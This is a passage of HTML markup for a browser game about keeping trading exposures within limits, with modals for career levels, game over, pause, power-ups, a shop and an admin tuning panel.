            <div id="scoreLeaderboard" class="leaderboard-content" style="display: none;">
                <div style="color: #888; text-align: center; padding: 20px;">Loading...</div>
            </div>
        </div>
        
        <div class="modal-buttons">
            <button class="modal-btn" onclick="closeLeaderboard()">Close</button>
        </div>
    </div>
</div>

<!-- Instructions Modal -->
<div class="profile-modal" id="instructionsModal" style="display: none;">
    <div class="modal-content" style="max-width: 600px;">
        <div style="position: relative;">
            <h2 class="modal-title"> How to Play</h2>
            <button onclick="closeInstructions()" style="position: absolute; top: -10px; right: -10px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: white; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center;">&times;</button>
        </div>
        <div style="text-align: left; margin: 20px 0; line-height: 1.6; flex: 1; overflow-y: auto; max-height: 60vh;">
            <h3 style="color: #00d4ff; margin-bottom: 10px;"> Objective</h3>
            <p style="margin-bottom: 15px;">Manage financial market exposures by keeping them within safe limits. Score points by making smart trades and avoiding breaches.</p>
            
            <h3 style="color: #00d4ff; margin-bottom: 10px;"> Color System</h3>
            <p style="margin-bottom: 15px;"><span style="color: #00ff00;">Green</span>: Safe (0-74% of limit) | <span style="color: #ffff00;">Yellow</span>: Warning (75-99%) | <span style="color: #ff0000;">Red</span>: Breach (100-149%) | <span style="color: #ffffff;">White</span>: Critical (150%+)</p>
            
            <h3 style="color: #00d4ff; margin-bottom: 10px;"> Power-ups</h3>
            <p style="margin-bottom: 15px;">Use the Power-ups tab to access strategic abilities: Market Freeze, Volatility Shield, Timer Freeze, and Reduce All exposures.</p>
            
            <h3 style="color: #00d4ff; margin-bottom: 10px;"> Coins & Shop</h3>
            <p>Earn coins by trading well, spend them in the shop to unlock new markets and power-ups!</p>
        </div>
        <div class="modal-buttons">
            <button class="modal-btn" onclick="closeInstructions()">Got It!</button>
        </div>
    </div>
</div>

<!-- Career Modal -->
<div class="profile-modal" id="careerModal" style="display: none;">
    <div class="modal-content" style="max-width: 500px;">
        <h2 class="modal-title"> Trading Career</h2>
        <p style="text-align: center; color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 30px;">Your journey from intern to market master</p>
        
        <div style="max-height: 400px; overflow-y: auto; padding-right: 10px;">
            <div class="career-level unlocked" data-level="1">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #4CAF50, #45a049); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">1</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Intern I</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">Starting level</div>
                </div>
            </div>
            
            <div class="career-level unlocked" data-level="2">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #4CAF50, #45a049); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">2</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Intern II</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">300 XP required</div>
                </div>
            </div>
            
            <div class="career-level current" data-level="3">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #FFC107, #FF9800); color: #000; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2); animation: current-pulse 2s ease-in-out infinite;">3</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Intern III</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">600 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="4">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">4</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Junior Trader I</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">1050 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="5">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">5</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Junior Trader II</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">1650 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="6">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">6</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Junior Trader III</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">2400 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="7">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">7</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Trader I</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">3300 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="8">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">8</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Trader II</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">4350 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="9">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">9</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Trader III</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">5550 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="10">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">10</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Senior Trader I</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">6900 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="11">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">11</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Senior Trader II</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">8400 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="12">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">12</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Senior Trader III</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">10050 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="13">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">13</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Lead Trader I</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">11850 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="14">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">14</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Lead Trader II</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">13800 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="15">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">15</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Lead Trader III</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">15900 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="16">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">16</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Principal Trader</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">18150 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="17">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">17</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">VP Trading</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">20550 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="18">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">18</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Managing Director</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">23100 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="19">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">19</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Head of Trading</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">25800 XP required</div>
                </div>
            </div>
            
            <div class="career-level locked" data-level="20">
                <div style="width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; margin-right: 16px; border: 2px solid rgba(255,255,255,0.2);">20</div>
                <div style="flex: 1;">
                    <div style="font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px;">Market Master</div>
                    <div style="font-size: 12px; color: rgba(255,255,255,0.6);">28650 XP required</div>
                </div>
            </div>
        </div>
        
        <div class="modal-buttons">
            <button class="modal-btn" onclick="closeCareer()">Close</button>
        </div>
    </div>
</div>

<!-- Game Over Modal -->
<div class="game-over-modal" id="gameOverModal" style="display: none;">
    <div class="game-over-content">
        <h1 class="game-over-title">GAME OVER</h1>
        <p class="game-over-subtitle" id="gameOverMessage">You ran out of lives!</p>
        
        <div class="game-over-stats">
            <div class="game-over-stat">
                <div class="stat-value" id="finalScore">0</div>
                <div class="stat-label">Final Score</div>
            </div>
            <div class="game-over-stat">
                <div class="stat-value" id="survivalTime">0s</div>
                <div class="stat-label">Time Survived</div>
            </div>
            <div class="game-over-stat">
                <div class="stat-value" id="totalTradesMade">0</div>
                <div class="stat-label">Trades Made</div>
            </div>
            <div class="game-over-stat">
                <div class="stat-value" id="breachesHandled">0</div>
                <div class="stat-label">Breaches Fixed</div>
            </div>
        </div>
        
        <div class="game-over-summary">
            <div class="summary-title">Session Rewards</div>
            <div class="summary-item">
                <span class="summary-label">XP Earned</span>
                <span class="summary-value" id="sessionXP">+0 XP</span>
            </div>
            <div class="summary-item">
                <span class="summary-label">Coins Earned</span>
                <span class="summary-value" id="sessionCoins">+0</span>
            </div>
            <div class="summary-item" id="levelUpIndicator" style="display: none;">
                <span class="summary-label">Level Up!</span>
                <span class="summary-value" style="color: #ffd700;">New Level Achieved!</span>
            </div>
            <div class="summary-item" id="newBestScore" style="display: none;">
                <span class="summary-label">New Best Score!</span>
                <span class="summary-value" style="color: #ff69b4;">Personal Record!</span>
            </div>
        </div>
        
        <div class="game-over-actions">
            <button class="game-over-btn" onclick="playAgain()">Play Again</button>
            <button class="game-over-btn secondary" onclick="closeGameOver()">Main Menu</button>
        </div>
    </div>
</div>

<!-- Pause Menu Modal -->
<div class="game-over-modal" id="pauseMenuModal" style="display: none;">
    <div class="game-over-content" style="border-color: rgba(0,212,255,0.6);">
        <h1 class="game-over-title" style="color: #00d4ff; animation: none;">GAME PAUSED</h1>
        <p class="game-over-subtitle">What would you like to do?</p>
        
        <div style="margin: 30px 0;">
            <div style="background: rgba(255,255,255,0.08); border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid rgba(255,255,255,0.15);">
                <div style="color: rgba(255,255,255,0.8); font-size: 14px; margin-bottom: 10px;">Current Session:</div>
                <div style="color: #00ff88; font-weight: 700; font-size: 16px;">Score: <span id="pauseScore">0</span></div>
                <div style="color: #00ff88; font-weight: 700; font-size: 16px;">Time: <span id="pauseTime">0s</span></div>
            </div>
        </div>
        
        <div class="game-over-actions">
            <button class="game-over-btn" onclick="resumeGame()"> Resume Game</button>
            <button class="game-over-btn secondary" onclick="endGameFromPause()"> End Game</button>
        </div>
    </div>
</div>

<!-- Game Screen -->
<div class="game-screen" id="gameScreen">
    <div class="header"><h1>Trading Exposure Manager</h1></div>
    
    <div class="user-profile">
        <div class="profile-left">
            <div class="username-display" id="usernameDisplay">Guest Trader</div>
            <div class="level-info">
                <div class="level-badge" id="levelBadge">Level 1</div>
                <div class="xp-bar-container">
                    <div class="xp-bar" id="xpBar" style="width: 0%;"></div>
                </div>
                <div class="xp-text" id="xpText">0 / 100 XP</div>
            </div>
        </div>
        <div class="profile-buttons">
            <button class="profile-btn" onclick="showPauseMenu()"> Menu</button>
            <button class="profile-btn" onclick="showShop()"> Shop</button>
            <button class="profile-btn" onclick="showStats()"> Stats</button>
            <div class="coins-display" id="coinsDisplay">0 </div>
        </div>
    </div>
    
    <div class="asset-tabs">
        <button class="tab-button active" onclick="switchAssetClass('indices')">
            Indices
            <span class="breach-badge" id="badge-indices" style="display: none;">0</span>
        </button>
        <button class="tab-button" onclick="switchAssetClass('forex')">
            Forex
            <span class="breach-badge" id="badge-forex" style="display: none;">0</span>
        </button>
        <button class="tab-button" onclick="switchAssetClass('shares')" id="sharesTab">
            Shares
            <span class="breach-badge" id="badge-shares" style="display: none;">0</span>
            <span id="sharesLock" style="position: absolute; top: -5px; right: -5px; font-size: 14px;"></span>
        </button>
        <button class="tab-button" onclick="switchAssetClass('commodities')">
            Commodities
            <span class="breach-badge" id="badge-commodities" style="display: none;">0</span>
        </button>
        <button class="tab-button" onclick="switchAssetClass('crypto')" id="cryptoTab">
            Crypto
            <span class="breach-badge" id="badge-crypto" style="display: none;">0</span>
            <span id="cryptoLock" style="position: absolute; top: -5px; right: -5px; font-size: 14px;"></span>
        </button>
        <button class="tab-button powerups" onclick="switchToPowerups()">
             Power-ups
        </button>
    </div>
    
    <div class="score-board">
        <div class="score-item">Score: <span id="score">0</span></div>
        <div class="score-item">Trades: <span id="trades">0</span></div>
        <div class="score-item">Breaches: <span id="breaches">0</span></div>
        <div class="score-item">
            <span id="strikesDisplay">
                <span class="strike-icon active" id="strike1"></span>
                <span class="strike-icon active" id="strike2"></span>
                <span class="strike-icon active" id="strike3"></span>
            </span>
        </div>
        <div class="score-item">Time: <span id="time">0</span>s</div>
        <div class="score-item difficulty-indicator">Difficulty: <span id="difficulty">Normal</span></div>
    </div>
    
    <div class="powerup-bar" id="powerupBar">
        <div class="powerup-label">POWERUPS</div>
        <div class="powerup-viewport">
            <div class="powerup-icons" id="powerupIcons">
                <!-- Powerups will be populated by JavaScript -->
            </div>
        </div>
        
        <div class="effects-section hidden" id="effectsSection">
            <div class="effects-label">ACTIVE:</div>
            <div class="active-effects" id="activeEffects"></div>
        </div>
    </div>
    
    <div class="market-container" id="marketsContainer">
        <div id="markets"></div>
    </div>
    
    <div class="powerups-container" id="powerupsContainer" style="display: none;">
        <h2 style="text-align: center; margin-bottom: 10px; color: #FFD700;"> Power-ups Arsenal</h2>
        <p style="text-align: center; color: rgba(255,255,255,0.7); font-size: 13px; margin-bottom: 20px;">Use strategic abilities to manage market chaos</p>
        
        <div class="powerups-grid">
            <div class="powerup-card" id="freezeCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Market Freeze</div>
                    <div class="powerup-count" id="freezeCount">0</div>
                </div>
                <div class="powerup-description">
                    Freeze all market movements for 10 seconds. Perfect for stopping cascading breaches or buying time to strategize.
                </div>
                <div class="powerup-status" id="freezeStatus">Ready to use</div>
                <button class="powerup-button" id="freezeButton" onclick="usePowerup('marketFreeze')">
                    ACTIVATE FREEZE
                </button>
                <div class="powerup-cooldown" id="freezeCooldown" style="display: none;">Ready in <span id="freezeTimer">0</span>s</div>
            </div>
            
            <div class="powerup-card" id="shieldCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Volatility Shield</div>
                    <div class="powerup-count" id="shieldCount">0</div>
                </div>
                <div class="powerup-description">
                    Reduce market volatility by 70% for 15 seconds. Gives you breathing room during high-stress periods.
                </div>
                <div class="powerup-status" id="shieldStatus">Ready to use</div>
                <button class="powerup-button" id="shieldButton" onclick="usePowerup('volatilityShield')">
                    ACTIVATE SHIELD
                </button>
                <div class="powerup-cooldown" id="shieldCooldown" style="display: none;">Ready in <span id="shieldTimer">0</span>s</div>
            </div>
            
            <div class="powerup-card" id="reduceCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Reduce All</div>
                    <div class="powerup-count" id="reduceAllCount">0</div>
                </div>
                <div class="powerup-description">
                    Instantly cut all current exposures by 25%. Emergency risk reduction across your entire portfolio.
                </div>
                <div class="powerup-status" id="reduceStatus">Ready to use</div>
                <button class="powerup-button" id="reduceButton" onclick="usePowerup('reduceExposures')">
                    REDUCE EXPOSURES
                </button>
                <div class="powerup-cooldown" id="reduceCooldown" style="display: none;">Ready in <span id="reduceTimer">0</span>s</div>
            </div>
            
            <div class="powerup-card" id="oldFreezeCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Freeze Timer</div>
                    <div class="powerup-count" id="oldFreezeCount">0</div>
                </div>
                <div class="powerup-description">
                    Stop breach countdown timers for 5 seconds. Gives extra time to resolve critical situations.
                </div>
                <div class="powerup-status" id="oldFreezeStatus">Ready to use</div>
                <button class="powerup-button" id="oldFreezeButton" onclick="usePowerup('freezeTimer')">
                    STOP TIMERS
                </button>
                <div class="powerup-cooldown" id="oldFreezeCooldown" style="display: none;">Ready in <span id="oldFreezeTimer">0</span>s</div>
            </div>
            
            <div class="powerup-card" id="tradingPlacesCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Trading Places</div>
                    <div class="powerup-count" id="tradingPlacesCount">0</div>
                </div>
                <div class="powerup-description">
                    Commodity market exposures are frozen for 60 seconds. Prevents all commodity fluctuations while other markets continue.
                </div>
                <div class="powerup-status" id="tradingPlacesStatus">Ready to use</div>
                <button class="powerup-button" id="tradingPlacesButton" onclick="usePowerup('tradingPlaces')">
                    TURN THOSE MACHINES BACK ON!
                </button>
                <div class="powerup-cooldown" id="tradingPlacesCooldown" style="display: none;">Ready in <span id="tradingPlacesTimer">0</span>s</div>
            </div>
            
            <div class="powerup-card" id="hotVolsCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Hot Vols</div>
                    <div class="powerup-count" id="hotVolsCount">0</div>
                </div>
                <div class="powerup-description">
                    Doubles global market volatility for 30 seconds. Creates chaos but also opportunities for massive score gains.
                </div>
                <div class="powerup-status" id="hotVolsStatus">Ready to use</div>
                <button class="powerup-button" id="hotVolsButton" onclick="usePowerup('hotVols')">
                    ACTIVATE HOT VOLS
                </button>
                <div class="powerup-cooldown" id="hotVolsCooldown" style="display: none;">Ready in <span id="hotVolsTimer">0</span>s</div>
            </div>
            
            <div class="powerup-card" id="noddingBirdCard">
                <div class="powerup-header">
                    <div class="powerup-title"> Nodding Bird</div>
                    <div class="powerup-count" id="noddingBirdCount">0</div>
                </div>
                <div class="powerup-description">
                    Automatically hedges exposure breaches for 30 seconds. The bird nods and fixes breaches without your input.
                </div>
                <div class="powerup-status" id="noddingBirdStatus">Ready to use</div>
                <button class="powerup-button" id="noddingBirdButton" onclick="usePowerup('noddingBird')">
                    ACTIVATE NODDING BIRD
                </button>
                <div class="powerup-cooldown" id="noddingBirdCooldown" style="display: none;">Ready in <span id="noddingBirdTimer">0</span>s</div>
            </div>
        </div>
    </div>
    
    <div class="game-controls">
        <button class="control-btn" id="pauseBtn" onclick="togglePause()">Pause</button>
        <button class="control-btn" onclick="resetGame()">Reset</button>
        <button class="control-btn" onclick="changeDifficulty()">Difficulty: <span id="difficultyDisplay">Normal</span></button>
        <button class="control-btn admin-btn" onclick="toggleAdminPanel()">Admin</button>
        <button class="control-btn" onclick="endGame('Test game over')">Test Game Over</button>
    </div>
    
    <div class="admin-panel" id="adminPanel" style="display: none;">
        <h2 style="color: #9C27B0; text-align: center; margin-bottom: 20px;"> Admin Settings</h2>
        
        <div class="admin-section">
            <h3>Player Testing</h3>
            <div class="admin-control">
                <label>Level Editor:</label>
                <input type="number" id="levelEditor" value="1" min="1" max="20" onchange="setPlayerLevel()">
            </div>
            <div class="admin-control">
                <label>Coins Editor:</label>
                <input type="number" id="coinsEditor" value="0" min="0" onchange="setPlayerCoins()">
            </div>
            <div style="text-align: center; margin-top: 15px;">
                <button onclick="unlockAllAssets()" style="padding: 8px 12px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">Unlock All Assets</button>
                <button onclick="resetProgress()" style="padding: 8px 12px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">Reset Progress</button>
                <button onclick="giveAllPowerups()" style="padding: 8px 12px; background: #9C27B0; color: white; border: none; border-radius: 4px; cursor: pointer;">Give All Power-ups</button>
            </div>
        </div>
        
        <div class="admin-section">
            <h3>Coin Rewards</h3>
            <div class="admin-control">
                <label>Good Trade Coins:</label>
                <input type="number" id="goodTradeCoins" value="0.5" onchange="updateCoinSetting('goodTrade', this.value)">
            </div>
            <div class="admin-control">
                <label>Breach Hedge Coins:</label>
                <input type="number" id="breachHedgeCoins" value="1" onchange="updateCoinSetting('breachHedge', this.value)">
            </div>
            <div class="admin-control">
                <label>Breach Clear Coins:</label>
                <input type="number" id="breachClearCoins" value="3" onchange="updateCoinSetting('breachClear', this.value)">
            </div>
            <div class="admin-control">
                <label>End Game Divisor:</label>
                <input type="number" id="endGameDivisor" value="20" onchange="updateCoinSetting('endGameMultiplier', this.value)">
            </div>
            <div class="admin-control">
                <label>Perfect Game Bonus:</label>
                <input type="number" id="perfectGameCoins" value="50" onchange="updateCoinSetting('perfectGameBonus', this.value)">
            </div>
            <div class="admin-control">
                <label>Level Up Bonus:</label>
                <input type="number" id="levelUpCoins" value="25" onchange="updateCoinSetting('levelUpBonus', this.value)">
            </div>
        </div>
        
        <div class="admin-section">
            <h3>Scoring System</h3>
            <div class="admin-control">
                <label>Breach Hedge Points:</label>
                <input type="number" id="breachHedgePoints" value="25" onchange="updateAdminSetting('breachHedgePoints', this.value)">
            </div>
            <div class="admin-control">
                <label>Breach Clear Bonus:</label>
                <input type="number" id="breachClearBonus" value="50" onchange="updateAdminSetting('breachClearBonus', this.value)">
            </div>
            <div class="admin-control">
                <label>Good Trade Bonus:</label>
                <input type="number" id="goodTradeBonus" value="15" onchange="updateAdminSetting('goodTradeBonus', this.value)">
            </div>
            <div class="admin-control">
                <label>Bad Trade Penalty:</label>
                <input type="number" id="badTradePenalty" value="-50" onchange="updateAdminSetting('badTradePenalty', this.value)">
            </div>
            <div class="admin-control">
                <label>Cause Breach Penalty:</label>
                <input type="number" id="causeBreachPenalty" value="-100" onchange="updateAdminSetting('causeBreachPenalty', this.value)">
            </div>
            <div class="admin-control">
                <label>Worse Breach Penalty:</label>
                <input type="number" id="worseBreachPenalty" value="-75" onchange="updateAdminSetting('worseBreachPenalty', this.value)">
            </div>
            <div class="admin-control">
                <label>Timeout Penalty:</label>
                <input type="number" id="timeoutPenalty" value="-150" onchange="updateAdminSetting('timeoutPenalty', this.value)">
            </div>
        </div>
        
        <div class="admin-section">
            <h3>Market Behavior</h3>
            <div class="admin-control">
                <label>Global Volatility Multiplier:</label>
                <input type="number" step="0.1" id="globalVolatilityMultiplier" value="1.0" onchange="updateAdminSetting('globalVolatilityMultiplier', this.value)">
            </div>
            <div class="admin-control">
                <label>Current Global Volatility:</label>
                <span id="currentGlobalVolatility" style="color: #00ff00; font-weight: bold;">1.0</span>
            </div>
            <div class="admin-control">
                <label>Breach Timer (seconds):</label>
                <input type="number" id="breachTimerSeconds" value="7" onchange="updateAdminSetting('breachTimerSeconds', this.value)">
            </div>
        </div>
        
        <div class="admin-section">
            <h3>Asset Class Volatility Multipliers</h3>
            <div class="admin-control">
                <label>Indices Volatility:</label>
                <input type="number" step="0.1" id="indicesVolatilityMultiplier" value="1.0" onchange="updateAssetSetting('assetVolatilityMultipliers', 'indices', this.value)">
            </div>
            <div class="admin-control">
                <label>Forex Volatility:</label>
                <input type="number" step="0.1" id="forexVolatilityMultiplier" value="0.6" onchange="updateAssetSetting('assetVolatilityMultipliers', 'forex', this.value)">
            </div>
            <div class="admin-control">
                <label>Shares Volatility:</label>
                <input type="number" step="0.1" id="sharesVolatilityMultiplier" value="1.4" onchange="updateAssetSetting('assetVolatilityMultipliers', 'shares', this.value)">
            </div>
            <div class="admin-control">
                <label>Commodities Volatility:</label>
                <input type="number" step="0.1" id="commoditiesVolatilityMultiplier" value="1.2" onchange="updateAssetSetting('assetVolatilityMultipliers', 'commodities', this.value)">
            </div>
            <div class="admin-control">
                <label>Crypto Volatility:</label>
                <input type="number" step="0.1" id="cryptoVolatilityMultiplier" value="2.0" onchange="updateAssetSetting('assetVolatilityMultipliers', 'crypto', this.value)">
            </div>
        </div>
        
        <div class="admin-section">
            <h3>Game End Conditions</h3>
            <div class="admin-control">
                <label>Max Missed Timers:</label>
                <input type="number" id="maxMissedTimers" value="3" min="1" max="10" onchange="updateGameEndSetting('maxMissedTimers', this.value)">
            </div>
            <div class="admin-control">
                <label>Time Limit (minutes):</label>
                <input type="number" id="timeLimitMinutes" value="5" min="1" max="30" onchange="updateGameEndSetting('timeLimitMinutes', this.value)">
            </div>
            <div class="admin-control">
                <label>Escalation Amount:</label>
                <input type="number" step="0.1" id="escalationAmount" value="0.5" min="0.1" max="2.0" onchange="updateGameEndSetting('escalationAmount', this.value)">
            </div>
            <div style="text-align: center; margin-top: 10px;">
                <button onclick="toggleGameEndCondition('enableMissedTimerLimit')" id="toggleMissedTimer" style="padding: 6px 12px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 2px;">Missed Timer Limit: ON</button>
                <button onclick="toggleGameEndCondition('enableTimeLimit')" id="toggleTimeLimit" style="padding: 6px 12px; background: #666; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 2px;">Time Limit: OFF</button>
                <button onclick="toggleGameEndCondition('enableEscalatingDifficulty')" id="toggleEscalating" style="padding: 6px 12px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 2px;">Escalating: ON</button>
            </div>
        </div>
        
        <div style="text-align: center;">
            <button class="control-btn" onclick="resetAdminSettings()">Reset to Defaults</button>
            <button class="control-btn admin-btn" onclick="toggleAdminPanel()">Close Admin</button>
        </div>
    </div>
</div>

<!-- Shop Modal -->
<div class="profile-modal" id="shopModal" style="display: none;">
    <div class="modal-content" style="max-width: 500px;">
        <h2 class="modal-title"> Shop</h2>
        <div style="margin-bottom: 20px; text-align: center;">
            <div style="display: inline-block; background: linear-gradient(135deg, #ffd700, #ffb300); color: #000; padding: 8px 16px; border-radius: 15px; font-weight: bold; font-size: 16px;">
